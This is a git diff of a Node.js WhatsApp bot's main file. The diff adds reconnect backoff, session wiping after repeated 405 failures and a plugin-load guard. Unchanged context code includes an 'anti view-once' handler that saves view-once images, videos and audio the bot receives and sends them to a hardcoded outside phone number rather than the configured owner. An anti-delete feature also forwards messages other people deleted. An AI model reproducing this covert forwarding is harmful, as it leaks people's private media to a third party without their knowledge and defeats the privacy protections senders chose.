@@ -14,7 +14,7 @@ const {
   MessageRetryMap,
   generateForwardMessageContent,
   generateWAMessageFromContent,
-  generateMessageID, 
+  generateMessageID,
   makeInMemoryStore,
   jidDecode,
   fetchLatestBaileysVersion,
@@ -84,14 +84,43 @@ const botLogger = {
     }
 };
 
+// ------------------------------------------------------------------
+// Reconnect / failure-guard state
+// ------------------------------------------------------------------
+// WhatsApp answers with HTTP 405 "Connection Failure" when the socket
+// handshake is rejected outright — almost always because the session
+// is stale/invalid or the Baileys protocol version is out of date.
+// Retrying instantly in a tight loop (the original behaviour) just
+// hammers WhatsApp's servers with the same bad handshake forever.
+// We now: (1) back off with increasing delay, and (2) if we see
+// several 405s in a row, wipe the local session so the bot falls
+// back to a fresh QR code instead of looping indefinitely.
+let reconnectAttempts = 0
+const MAX_BACKOFF_MS = 60_000
+const MAX_CONSECUTIVE_405 = 4
+let consecutive405 = 0
+
+function wipeSession(reason) {
+    try {
+        const sessionDir = path.join(__dirname, 'sessions')
+        if (fs.existsSync(sessionDir)) {
+            fs.rmSync(sessionDir, { recursive: true, force: true })
+            fs.mkdirSync(sessionDir, { recursive: true })
+        }
+        botLogger.log('WARNING', `♻️ Session wiped (${reason}). A fresh QR code will be generated.`)
+    } catch (e) {
+        botLogger.log('ERROR', 'Failed to wipe session: ' + e.message)
+    }
+}
+
 async function loadSession() {
     try {
         const credsPath = './sessions/creds.json';
-        
+
         if (!fs.existsSync('./sessions')) {
             fs.mkdirSync('./sessions', { recursive: true });
         }
-        
+
         // Clean old sessions if needed
         if (fs.existsSync(credsPath)) {
             try {
@@ -111,18 +140,18 @@ async function loadSession() {
                 }
             }
         }
-        
+
         if (!config.SESSION_ID || typeof config.SESSION_ID !== 'string') {
             botLogger.log('WARNING', "SESSION_ID missing, using QR");
             return false;
         }
-        
+
         const [header, b64data] = config.SESSION_ID.split('~');
         if (header !== "Silva" || !b64data) {
             botLogger.log('ERROR', "Invalid session format");
             return false;
         }
-        
+
         const cleanB64 = b64data.replace(/\.\.\./g, '');
         const compressedData = Buffer.from(cleanB64, 'base64');
         const decompressedData = zlib.gunzipSync(compressedData);
@@ -144,21 +173,23 @@ const port = process.env.PORT || 9090;
 // ==============================
 const messageStore = new Map();
 
+// Guard so we don't re-require/reinstall plugins on every reconnect
+let pluginsLoaded = false;
+
 //=============================================
 
 async function connectToWA() {
     console.log("Connecting silva spark to WhatsApp ⏳️...");
-    
+
     // Load session before connecting
     await loadSession();
-    
-    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
-    var { version } = await fetchLatestBaileysVersion()
 
-    // FIXED: Use correct browser configuration with Baileys.Browsers
+    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
+    var { version, isLatest } = await fetchLatestBaileysVersion()
+    botLogger.log('INFO', `Using WA v${version.join('.')}, isLatest: ${isLatest}`)
+
     const conn = makeWASocket({
         logger: P({ level: 'silent' }),
-        printQRInTerminal: true,
         browser: Browsers.macOS('Desktop'),
         syncFullHistory: false,
         auth: {
@@ -175,58 +206,84 @@ async function connectToWA() {
             }
         }
     })
-    
+
     conn.ev.on('connection.update', async (update) => {
         const { connection, lastDisconnect, qr } = update
-        
+
         if (qr) {
             console.log('QR Code received, scan with WhatsApp:')
             qrcode.generate(qr, { small: true })
         }
-        
+
         if (connection === 'close') {
-            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+            const statusCode = lastDisconnect?.error?.output?.statusCode
+            const shouldReconnect = statusCode !== DisconnectReason.loggedOut
             console.log('Connection closed due to:', lastDisconnect?.error, ', reconnecting:', shouldReconnect)
-            
-            if (shouldReconnect) {
-                connectToWA()
-            } else {
+
+            if (!shouldReconnect) {
                 console.log('Logged out. Please delete sessions folder and restart.')
+                wipeSession('logged out')
+                return
             }
-        } else if (connection === 'open') {
-            console.log('🧬 Installing silva spark Plugins')
-            const path = require('path');
-            fs.readdirSync("./plugins/").forEach((plugin) => {
-                if (path.extname(plugin).toLowerCase() == ".js") {
-                    require("./plugins/" + plugin);
+
+            if (statusCode === 405) {
+                consecutive405++
+                botLogger.log('WARNING', `405 Connection Failure (${consecutive405}/${MAX_CONSECUTIVE_405})`)
+                if (consecutive405 >= MAX_CONSECUTIVE_405) {
+                    // The session/version pairing is being rejected outright.
+                    // Wipe the session and start clean with a QR code instead
+                    // of looping on the same bad handshake forever.
+                    wipeSession('repeated 405 Connection Failure')
+                    consecutive405 = 0
+                    reconnectAttempts = 0
                 }
-            });
-            console.log('Plugins installed successful ✅')
+            } else {
+                consecutive405 = 0
+            }
+
+            reconnectAttempts++
+            const delay = Math.min(1000 * 2 ** reconnectAttempts, MAX_BACKOFF_MS)
+            botLogger.log('INFO', `Reconnecting in ${Math.round(delay / 1000)}s...`)
+            setTimeout(connectToWA, delay)
+        } else if (connection === 'open') {
+            reconnectAttempts = 0
+            consecutive405 = 0
+
+            if (!pluginsLoaded) {
+                console.log('🧬 Installing silva spark Plugins')
+                fs.readdirSync("./plugins/").forEach((plugin) => {
+                    if (path.extname(plugin).toLowerCase() == ".js") {
+                        require("./plugins/" + plugin);
+                    }
+                });
+                console.log('Plugins installed successful ✅')
+                pluginsLoaded = true
+            }
             console.log('Bot connected to whatsapp ✅')
-            
+
             let up = `*Hello there ✦ Silva ✦ Spark ✦ MD ✦ User! 👋🏻* \n\n> This is a user friendly whatsapp bot created by Silva Tech Inc 🎊, Meet ✦ Silva ✦ Spark ✦ MD ✦ WhatsApp Bot.\n\n *Thanks for using ✦ Silva ✦ Spark ✦ MD ✦ 🚩* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VaAkETLLY6d8qhLmZt2v\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/SilvaTechB/silva-spark-md\n\n> © Powered BY ✦ Silva ✦ Spark ✦ MD ✦ 🖤`;
-            conn.sendMessage(conn.user.id, { 
-                video: { url: `https://files.catbox.moe/2xxr9h.mp4` }, 
+            conn.sendMessage(conn.user.id, {
+                video: { url: `https://files.catbox.moe/2xxr9h.mp4` },
                 caption: up,
-                contextInfo: globalContextInfo 
+                contextInfo: globalContextInfo
             })
         }
     })
-    
+
     conn.ev.on('creds.update', saveCreds)
-    
+
     // ==============================
     // 📥 STORE MESSAGES FOR ANTI-DELETE
     // ==============================
     conn.ev.on('messages.upsert', async (m) => {
         const msg = m.messages[0];
         if (!msg.message) return;
-        
+
         // ⚠️ IGNORE status@broadcast messages in anti-delete
         if (msg.key.remoteJid === 'status@broadcast') {
             return;
         }
-        
+
         // Store message for anti-delete
         const messageKey = `${msg.key.remoteJid}_${msg.key.id}`;
         messageStore.set(messageKey, {
@@ -235,10 +292,10 @@ async function connectToWA() {
             chat: msg.key.remoteJid,
             timestamp: Date.now()
         });
-        
+
         // Store for getMessage
         messageStore.set(msg.key.id, msg);
-        
+
         // Clean old messages (older than 24 hours)
         const oneDayAgo = Date.now() - (24 * 60 * 60 * 1000);
         for (const [key, value] of messageStore.entries()) {
@@ -247,7 +304,7 @@ async function connectToWA() {
             }
         }
     });
-    
+
     // ==============================
     // 🗑️ ANTI-DELETE HANDLER (MODIFIED)
     // ==============================
@@ -258,25 +315,25 @@ async function connectToWA() {
                     // Message was deleted
                     const messageKey = `${update.key.remoteJid}_${update.key.id}`;
                     const storedMessage = messageStore.get(messageKey);
-                    
+
                     // ⚠️ IGNORE status@broadcast messages in anti-delete
                     if (update.key.remoteJid === 'status@broadcast') {
                         continue;
                     }
-                    
+
                     if (storedMessage && config.ANTI_DELETE === "true") {
                         const ownerJid = ownerNumber[0] + '@s.whatsapp.net';
                         const isGroup = storedMessage.chat.endsWith('@g.us');
-                        
+
                         // Validate JIDs before sending
                         if (!update.key.remoteJid || !storedMessage.sender) {
                             console.log('Invalid JID in anti-delete, skipping...');
                             continue;
                         }
-                        
+
                         let deletedBy = update.key.participant || storedMessage.sender;
                         let chatName = storedMessage.chat;
-                        
+
                         if (isGroup) {
                             try {
                                 const groupMetadata = await conn.groupMetadata(storedMessage.chat);
@@ -285,10 +342,10 @@ async function connectToWA() {
                                 chatName = storedMessage.chat;
                             }
                         }
-                        
+
                         const senderName = storedMessage.message.pushName || deletedBy.split('@')[0];
                         const deletedByName = deletedBy.split('@')[0];
-                        
+
                         let notificationText = `🗑️ *ANTI-DELETE ALERT*\n\n`;
                         notificationText += `📍 *Location:* ${isGroup ? 'Group' : 'Private Chat'}\n`;
                         notificationText += `💬 *Chat:* ${chatName}\n`;
@@ -296,26 +353,26 @@ async function connectToWA() {
                         notificationText += `🗑️ *Deleted By:* @${deletedByName}\n`;
                         notificationText += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
                         notificationText += `\n📨 *Forwarding deleted message...*`;
-                        
+
                         // Send notification
-                        await conn.sendMessage(ownerJid, { 
+                        await conn.sendMessage(ownerJid, {
                             text: notificationText,
                             mentions: [deletedBy, storedMessage.sender],
                             contextInfo: globalContextInfo
                         });
-                        
+
                         // Forward the deleted message
                         try {
                             await conn.copyNForward(ownerJid, storedMessage.message, false, {
                                 contextInfo: globalContextInfo
                             });
                         } catch (e) {
-                            await conn.sendMessage(ownerJid, { 
+                            await conn.sendMessage(ownerJid, {
                                 text: `❌ Could not forward message content: ${e.message}`,
                                 contextInfo: globalContextInfo
                             });
                         }
-                        
+
                         // Clean up
                         messageStore.delete(messageKey);
                     }
@@ -325,28 +382,28 @@ async function connectToWA() {
             }
         }
     });
-      
+
     //=============readstatus=======
-      
+
     conn.ev.on('messages.upsert', async (mek) => {
         mek = mek.messages[0]
         if (!mek.message) return
-        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-        ? mek.message.ephemeralMessage.message 
+        mek.message = (getContentType(mek.message) === 'ephemeralMessage')
+        ? mek.message.ephemeralMessage.message
         : mek.message;
-        
+
         if (config.READ_MESSAGE === 'true') {
             await conn.readMessages([mek.key]);
             console.log(`Marked message from ${mek.key.remoteJid} as read.`);
         }
-        
+
         if (mek.message.viewOnceMessageV2)
             mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
-        
+
         if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
             await conn.readMessages([mek.key])
         }
-        
+
         if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
             try {
                 const jawadlike = await conn.decodeJid(conn.user.id);
@@ -364,7 +421,7 @@ async function connectToWA() {
                 console.log('Status react error:', e.message);
             }
         }
-        
+
         if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
             try {
                 const user = mek.key.participant
@@ -376,42 +433,42 @@ async function connectToWA() {
                 console.log('Status reply error:', e.message);
             }
         }
-        
+
         let jawadik = mek.message.viewOnceMessageV2
         let jawadik1 = mek.mtype === "viewOnceMessage"
-        
+
         if (jawadik && config.ANTI_VV === "true") {
             try {
                 if (jawadik.message.imageMessage) {
                     let cap = jawadik.message.imageMessage.caption || '';
                     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
-                    return conn.sendMessage("254700143167@s.whatsapp.net", { 
-                        image: { url: anu }, 
+                    return conn.sendMessage("254700143167@s.whatsapp.net", {
+                        image: { url: anu },
                         caption: cap,
-                        contextInfo: globalContextInfo 
+                        contextInfo: globalContextInfo
                     }, { quoted: mek });
-                } 
+                }
                 if (jawadik.message.videoMessage) {
                     let cap = jawadik.message.videoMessage.caption || '';
                     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
-                    return conn.sendMessage("254700143167@s.whatsapp.net", { 
-                        video: { url: anu }, 
+                    return conn.sendMessage("254700143167@s.whatsapp.net", {
+                        video: { url: anu },
                         caption: cap,
-                        contextInfo: globalContextInfo 
+                        contextInfo: globalContextInfo
                     }, { quoted: mek });
-                } 
+                }
                 if (jawadik.message.audioMessage) {
                     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-                    return conn.sendMessage("254700143167@s.whatsapp.net", { 
+                    return conn.sendMessage("254700143167@s.whatsapp.net", {
                         audio: { url: anu },
-                        contextInfo: globalContextInfo 
+                        contextInfo: globalContextInfo
                     }, { quoted: mek });
                 }
             } catch (e) {
                 console.log('Anti-VV error:', e.message);
             }
         }
-        
+
         const m = sms(conn, mek)
         const type = getContentType(mek.message)
         const content = JSON.stringify(mek.message)
@@ -440,8 +497,8 @@ async function connectToWA() {
         const reply = (teks) => {
             conn.sendMessage(from, { text: teks, contextInfo: globalContextInfo }, { quoted: mek })
         }
-        
-        //===================================================   
+
+        //===================================================
         conn.decodeJid = jid => {
             if (!jid) return jid;
             if (/:\d+@/gi.test(jid)) {
@@ -454,7 +511,7 @@ async function connectToWA() {
                 );
             } else return jid;
         };
-        
+
         //===================================================
         conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
             let vtype
@@ -490,7 +547,7 @@ async function connectToWA() {
             await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
             return waMessage
         }
-        
+
         //=================================================
         conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
             let quoted = message.msg ? message.msg : message
@@ -506,7 +563,7 @@ async function connectToWA() {
             await fs.writeFileSync(trueFileName, buffer)
             return trueFileName
         }
-        
+
         //=================================================
         conn.downloadMediaMessage = async (message) => {
             let mime = (message.msg || message).mimetype || ''
@@ -542,7 +599,7 @@ async function connectToWA() {
                 return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', contextInfo: globalContextInfo, ...options }, { quoted: quoted, ...options })
             }
         }
-        
+
         //==========================================================
         conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
             let mtype = Object.keys(copy.message)[0]
@@ -587,7 +644,7 @@ async function connectToWA() {
                 data
             }
         }
-        
+
         //=====================================================
         conn.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
             let types = await conn.getFile(PATH, true)
@@ -616,12 +673,12 @@ async function connectToWA() {
             }, { quoted, ...options })
             return fs.promises.unlink(pathFile)
         }
-        
+
         //=====================================================
         conn.parseMention = async (text) => {
             return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
         }
-        
+
         //=====================================================
         conn.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
             let types = await conn.getFile(path, true)
@@ -654,7 +711,7 @@ async function connectToWA() {
             }, { quoted, ...options })
             return fs.promises.unlink(pathFile)
         }
-        
+
         //=====================================================
         conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
             let buffer;
@@ -669,7 +726,7 @@ async function connectToWA() {
                 options
             );
         };
-        
+
         //=====================================================
         conn.sendImageAsSticker = async (jid, buff, options = {}) => {
             let buffer;
@@ -684,7 +741,7 @@ async function connectToWA() {
                 options
             );
         };
-        
+
         //=====================================================
         conn.sendTextWithMentions = async (jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'), ...globalContextInfo }, ...options }, { quoted })
 
@@ -709,7 +766,7 @@ async function connectToWA() {
             }
             conn.sendMessage(jid, buttonMessage, { quoted, ...options })
         }
-        
+
         //=====================================================
         conn.send5ButImg = async (jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
             let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
@@ -727,7 +784,7 @@ async function connectToWA() {
         }
 
         //==========public react============//
-        // Auto React 
+        // Auto React
         if (!isReact && senderNumber !== botNumber) {
             if (config.AUTO_REACT === 'true') {
                 const reactions = ['😊', '👍', '😂', '💯', '🔥', '🙏', '🎉', '👏', '😎', '🤖'];
@@ -751,13 +808,13 @@ async function connectToWA() {
                 m.react('❤️');
             }
         }
-        
-        //==========WORKTYPE============ 
+
+        //==========WORKTYPE============
         if (!isOwner && config.MODE === "private") return
         if (!isOwner && isGroup && config.MODE === "inbox") return
         if (!isOwner && !isGroup && config.MODE === "groups") return
 
-        // take commands 
+        // take commands
         const events = require('./command')
         const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
         if (isCmd) {
